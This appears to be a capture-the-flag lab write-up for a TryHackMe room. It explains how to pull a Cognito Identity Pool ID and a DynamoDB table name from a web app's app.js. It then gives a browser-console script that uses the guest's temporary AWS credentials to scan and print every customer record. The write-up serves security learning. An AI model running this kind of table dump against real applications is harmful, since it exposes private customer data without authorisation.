<p align="center">
  <img src="https://tryhackme.com/_next/image?url=https%3A%2F%2Fcdn-images.tryhackme.com%2Froom-icons%2F5dbea226085ab6182a2ee0f7-1785251342649&w=96&q=75">
</p>

# Complimentary


## STEP 01

- Visit the Webapp:
  ```
  http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
  ```
  > - This app identifies the user through the **AWS Cognito Identity pool** +  **JS** <br>
  > - AWS Cognito Identity pool controls the user without account login using a temporary ID <br>
  > - JS creates the guest ID <br>
  > - The app uses **AWS Cognito Identity Pool** to give each visitor **temporary AWS credentials** without requiring an account login. The app creates a temporary guest ID in the browser and uses that ID to store and retrieve the user's information from a DynamoDB table. Because Cognito provides guest access, the user does not need to create an account or log in.

## STEP 02

- Inspect the Webapp (PRESS F12)
- Then navigate to the **Source**
- There you can see
  ```
  app.js
  ```
  > Then we realize that the application provides temporary IAM access through AWS Cognito Identity Pool. Since the browser receives temporary AWS credentials with an active session, we can use those credentials to interact with AWS services. Because we already know the DynamoDB table name from app.js, we can test the access permissions and retrieve database records using the same AWS session.
- It contains AWS Cognito Identity pool configuration information
  ```
  const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
  const AWS_REGION = "us-east-1";
  const TABLE_NAME = "complimentary-GuestWellnessProfiles";
  ```
  > - This confirms that the application uses an AWS Cognito Identity Pool to provide a temporary identity and AWS credentials to users without requiring a login. The application then uses this identity and a guest ID stored in the browser to retrieve user information from a DynamoDB table.

## FINAL STEP

- Find DynamoDB data fetching in `app.js`
- Then go to the **console** and run this: 
```
AWS.config.credentials.get(function (err) {
  if (err) {
    console.error(err);
    return;
  }
  const dynamodb = new AWS.DynamoDB({ region: "us-east-1" });
  dynamodb.scan({ TableName: "complimentary-GuestWellnessProfiles" }, function (err, data) {
    if (err) {
      console.error(err);
      return;
    }
    data.Items.forEach((item, index) => {
      console.log(`--- Guest Record #${index + 1} ---`);
      for (const [key, val] of Object.entries(item)) {
        console.log(`${key}:`, val.S || val.N || val);
      }
    });
  });
});
```
> The console prints the DynamoDB records of customers <br>
> then you can find your **FLAG** 🚩

# Congratulations on your Exploration 🎉
